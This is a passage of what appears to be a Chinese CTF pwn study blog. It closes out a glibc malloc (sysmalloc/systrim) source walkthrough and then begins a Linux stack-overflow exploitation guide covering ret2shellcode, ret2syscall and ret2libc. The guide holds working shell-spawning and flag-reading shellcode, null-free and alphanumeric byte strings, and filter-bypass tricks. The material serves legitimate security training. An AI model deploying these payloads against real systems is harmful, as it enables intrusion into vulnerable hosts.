class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">                      <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>)</span><br><span class="line">                      &#123;</span><br><span class="line">                          <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             跳过一些字节以达到一个对齐的位置。</span></span><br><span class="line"><span class="comment">                             我们不需要特别标记这些浪费的前端字节。</span></span><br><span class="line"><span class="comment">                             它们永远不会被访问到，因为</span></span><br><span class="line"><span class="comment">                             av-&gt;top的prev_inuse（以及任何从它的开始创建的区块）</span></span><br><span class="line"><span class="comment">                             在初始化后总是为真。</span></span><br><span class="line"><span class="comment">                           */</span></span><br><span class="line"></span><br><span class="line">                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* 找出当前的内存结束位置 */</span></span><br><span class="line">                  <span class="keyword">if</span> (snd_brk == (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">                  &#123;</span><br><span class="line">                      snd_brk = (<span class="type">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* 根据第二个sbrk的结果调整top */</span></span><br><span class="line">              <span class="keyword">if</span> (snd_brk != (<span class="type">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">              &#123;</span><br><span class="line">                  av-&gt;top = (mchunkptr)aligned_brk;</span><br><span class="line">                  set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">                  av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     如果不是第一次通过，我们要么有一个由于外部sbrk造成的间隙，</span></span><br><span class="line"><span class="comment">                     要么是一个非连续的区域。在old_top处插入一个双重栅栏防止合并</span></span><br><span class="line"><span class="comment">                     我们不拥有的空间。这些栅栏是标记为使用中的人工区块，</span></span><br><span class="line"><span class="comment">                     无论如何都太小而不能使用。我们需要两个栅栏以使大小和对齐工作。</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         缩小old_top以插入栅栏，保持大小为MALLOC_ALIGNMENT的倍数。</span></span><br><span class="line"><span class="comment">                         我们知道old_top中至少有足够的空间来做到这一点。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                      old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">                      set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         注意以下分配会完全覆盖old_top，</span></span><br><span class="line"><span class="comment">                         当old_size之前是MINSIZE时。这是故意的。</span></span><br><span class="line"><span class="comment">                         我们需要栅栏，即使old_top可能会因此丢失。</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                      chunk_at_offset(old_top, old_size)-&gt;size =</span><br><span class="line">                          (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                      chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                          (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                      <span class="comment">/* 如果可能，释放其余的部分。 */</span></span><br><span class="line">                      <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                      &#123;</span><br><span class="line">                          _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新最大系统内存使用量。</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)av-&gt;system_mem &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(av-&gt;max_system_mem))</span><br><span class="line">      av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查内存状态。</span></span><br><span class="line">  check_malloc_state(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最后，执行分配 */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查上述分配路径之一是否成功 */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset(p, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk(av, p, nb);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 捕获所有失败的路径 */</span></span><br><span class="line">  __set_errno(ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">systrim</span> <span class="params">(<span class="type">size_t</span> pad, mstate av)</span> &#123;</span><br><span class="line">  <span class="type">long</span> top_size;</span><br><span class="line">  <span class="type">long</span> extra;</span><br><span class="line">  <span class="type">long</span> released;</span><br><span class="line">  <span class="type">char</span> *current_brk;</span><br><span class="line">  <span class="type">char</span> *new_brk;</span><br><span class="line">  <span class="type">size_t</span> pagesize;</span><br><span class="line">  <span class="type">long</span> top_area;</span><br><span class="line"></span><br><span class="line">  pagesize = GLRO (dl_pagesize);</span><br><span class="line">  top_size = chunksize (av-&gt;top);</span><br><span class="line">  top_area = top_size - MINSIZE - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (top_area &lt;= pad)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  extra = ALIGN_DOWN(top_area - pad, pagesize);</span><br><span class="line">  <span class="comment">//计算top chunk中最大可释放的整数页大小,top chunk中至少需要MINSIZE的内存保存fencepost</span></span><br><span class="line">  <span class="keyword">if</span> (extra == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  current_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">  <span class="keyword">if</span> (current_brk == (<span class="type">char</span> *) (av-&gt;top) + top_size) &#123;</span><br><span class="line">    <span class="comment">//如果当前top chunk的结束地址与当前的brk值相等,执行heap收缩</span></span><br><span class="line">    MORECORE (-extra);</span><br><span class="line">    <span class="comment">//调用sbrk释放指定大小的内存</span></span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">    new_brk = (<span class="type">char</span> *) (MORECORE (<span class="number">0</span>));</span><br><span class="line">    LIBC_PROBE (memory_sbrk_less, <span class="number">2</span>, new_brk, extra);</span><br><span class="line">    <span class="keyword">if</span> (new_brk != (<span class="type">char</span> *) MORECORE_FAILURE) &#123;</span><br><span class="line">      <span class="comment">//计算释放的内存大小,更新当前分配区所分配的内存总量,更新top chunk的大小</span></span><br><span class="line">      released = (<span class="type">long</span>) (current_brk - new_brk);</span><br><span class="line">      <span class="keyword">if</span> (released != <span class="number">0</span>) &#123;</span><br><span class="line">        av-&gt;system_mem -= released;</span><br><span class="line">        set_head (av-&gt;top, (top_size - released) | PREV_INUSE);</span><br><span class="line">        check_malloc_state (av);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="版本变化"><a href="#版本变化" class="headerlink" title="版本变化"></a>版本变化</h1><h2 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h2><h2 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h2><h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><h2 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h2><h2 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h2>]]></content>
  </entry>
  <entry>
    <title>linux 栈溢出</title>
    <url>/2024/11/08/linux-stack-overflow/</url>
    <content><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。</p>
<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>栈溢出覆盖返回地址为后门函数从而获取shell。</p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>将shellcode写入可执行的内存地址处，然后栈溢出覆盖返回地址到shellcode从而执行shellcode获取shell。<br>测试 shellcode 例题：</p>
<ul>
<li><p>32位例题：wdb_2018_3rd_soEasy</p>
</li>
<li><p>64位例题：ciscn_2019_n_5</p>
</li>
</ul>
<h2 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h2><ul>
<li><p>32位</p>
<ul>
<li><p>shell（21字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>orw（56字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>   无 <code>\x00</code> 截断版（21字节）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure></div>
<p>scanf 可读取版（41字节）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>64位</p>
<ul>
<li><p>shell（22字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>无 <code>\x00</code> 截断且 scanf 可读版（22字节）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>orw（43字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>某些题目还会禁用 SYS_open ，需要用 SYS_openat 代替。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, -100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 257 ;// SYS_openat</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 123 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<h2 id="pwntools-生成"><a href="#pwntools-生成" class="headerlink" title="pwntools 生成"></a>pwntools 生成</h2><ul>
<li><p>shell（32位44字节，64位48字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>orw</p>
<ul>
<li><p>32位（55字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>64位（66字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<h2 id="纯-ascii-码-shellcode"><a href="#纯-ascii-码-shellcode" class="headerlink" title="纯 ascii 码 shellcode"></a>纯 ascii 码 shellcode</h2><p><a class="link"   href="https://github.com/TaQini/alpha3" >alpha3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 项目可以实现可见 shellcode 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>)</span><br><span class="line">fp.write(asm(shellcraft.sh()))</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">shellcode = os.popen(<span class="string">&quot;python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode</span><br></pre></td></tr></table></figure></div>
<p><strong>注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至 shellcode 时 rax 必须为 shellcode 的地址。设置为其他寄存器同理。</strong></p>
<ul>
<li><p>32 位（70字节，eax）</p>
  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01</span><br></pre></td></tr></table></figure></div></li>
<li><p>64 位（105字节，rax）</p>
  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103S0g0x4L1L0R2n1n0W7K7o0Y7K0d2m4B0U380a050W</span><br></pre></td></tr></table></figure></div></li>
<li><p>64 位（271字节，rdi）</p>
  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M7M1o1M170Y172y0h16110j100o0Z0J131k1217100Z110Y0i0Z0Y09110k0x2I100i0i020W130e0F0x0x0V0c0Z0u0A2n101k0t2K0h0i0t180y0D132F110M130y120c102n102q141N117K110a122k112H102O17031709102Z172q102q122L162L110e120S102u121N107o00</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="x00-截断"><a href="#x00-截断" class="headerlink" title="\x00 截断"></a><code>\x00</code> 截断</h2><p>对于过滤 shellcode 的题目一般是采用 strlen 获取 shellcode长度，因此可以在shellcode前加一个以 <code>\x00</code> 开头的指令来绕过对 shellcode 的过滤。</p>
<p>64 位的指令如下，32 位的话寄存器会改下名，opcode 不变。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">40</span> <span class="number">00</span>                 add    BYTE PTR [rax+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">41</span> <span class="number">00</span>                 add    BYTE PTR [rcx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">42</span> <span class="number">00</span>                 add    BYTE PTR [rdx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">43</span> <span class="number">00</span>                 add    BYTE PTR [rbx+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">45</span> <span class="number">00</span>                 add    BYTE PTR [rbp+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">46</span> <span class="number">00</span>                 add    BYTE PTR [rsi+<span class="number">0x0</span>],  al</span><br><span class="line"><span class="number">00</span> <span class="number">47</span> <span class="number">00</span>                 add    BYTE PTR [rdi+<span class="number">0x0</span>],  al</span><br></pre></td></tr></table></figure></div>

<h2 id="测试-shellcode"><a href="#测试-shellcode" class="headerlink" title="测试 shellcode"></a>测试 shellcode</h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -zexecstack -g -m32 -o shellcode-test shellcode-test.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> shellcode[]=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&quot;</span>;</span><br><span class="line">	<span class="built_in">void</span>(*run)()=(<span class="built_in">void</span>(*)())shellcode;</span><br><span class="line">	<span class="built_in">run</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>构造rop链模拟系统调用过程</p>
<p><code>ROPgadget</code>有时可自动构造，但可能长度过长，建议手动构造。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget.py --binary ./pwn --ropchain</span><br></pre></td></tr></table></figure></div>

<p><code>ROPgadget</code>检索相关指令举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./pwn --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure></div>
<p><code>ropper</code> 检索 gadget 举例：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ropper --file ./pwn --nocolor &gt; rop</span><br></pre></td></tr></table></figure></div>

<p>注意：</p>
<ul>
<li>rax&#x2F;eax 寄存器通常用来存储返回值，因此可以通过控制返回值来控制 rax&#x2F;eax 寄存器，不一定需要 gadget。例如 alarm 函数每次会返回上一次设置的 alarm 的剩余时间，特别的，第一次会返回 0。因此可以通过栈溢出反复调用 alarm 并控制交互时间来控制 eax 寄存器的值。</li>
<li>可以通过 ret2csu 来控制寄存器。</li>
<li>如果寄存器不好控制可以考虑 SROP 。</li>
<li>如果缺少 <code>syscall; ret;</code> 可以考虑将题目中的 <code>alarm@got</code> 中的内容通过 rop（例如 <code>add byte ptr [rdi], al; ret;</code>）加一个偏移，这样 <code>alarm@plt</code> 就可以当做 <code>syscall; ret;</code> 使用。</li>
</ul>
<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><ul>
<li>eax &#x3D; 0x0b</li>
<li>ebx指向<code>&quot;/bin/sh&quot;</code></li>
<li>ecx &#x3D; 0x0</li>
<li>edx &#x3D; 0x0</li>
</ul>
<p>rop示例：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/0386c58178b9c5d125f63daaba1d0ab2.png"
                      alt="图片"
                ></p>
<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><ul>
<li>rax &#x3D; 0x3b</li>
<li>rdi指向<code>&quot;/bin/sh&quot;</code></li>
<li>rsi &#x3D; 0x0</li>
<li>rdx &#x3D; 0x0</li>
</ul>
<p>rop示例：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/513d283d1e58ea87558b0a1c7be5f06a.png"
                      alt="图片"
                ></p>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h2 id="linux延迟绑定机制"><a href="#linux延迟绑定机制" class="headerlink" title="linux延迟绑定机制"></a>linux延迟绑定机制</h2><p>动态链接每个函数需要两个东西：</p>
<ul>
<li><p>用来存放外部函数地址的数据段</p>
</li>
<li><p>用来获取数据段记录的外部函数地址的代码</p>
</li>
</ul>
<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/71e04df6969db4f75dcf43f09246a92b.png"
                      alt="图片"
                ></p>
<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址。</p>
<p>在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>举例：</p>
<p>第一次调用<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/5dfa1cfa3febe69de060b44636b1d515.png"
                      alt="在这里插入图片描述"
                ><br>之后再次调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/c1fdf7342f4974e396840a515fd5cafe.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="泄露函数地址"><a href="#泄露函数地址" class="headerlink" title="泄露函数地址"></a>泄露函数地址</h3><p>泄露libc函数地址的条件：程序中有输出函数，例如puts&#x2F;printf&#x2F;write</p>
<p>以<code>write(1,buf,20)</code>为例：</p>
<ul>
<li><p>32位</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/467d83f627ee475bff7982574983ebbb.png"
                      alt="image-20220201201536794"
                ></p>
</li>
<li><p>64位</p>
<p>需要控制三个参数，rdi，rsi，rdx</p>
<p>第三个参数代表输出的size，如果没有rdx的gadget可以暂时不管，输出多少无所谓。</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/d0960c383618941fa65bf62b257c8f79.png"
                      alt="在这里插入图片描述"
                ></p>
<p>  截取泄露的函数地址</p>
<ul>
<li><p>32位</p>
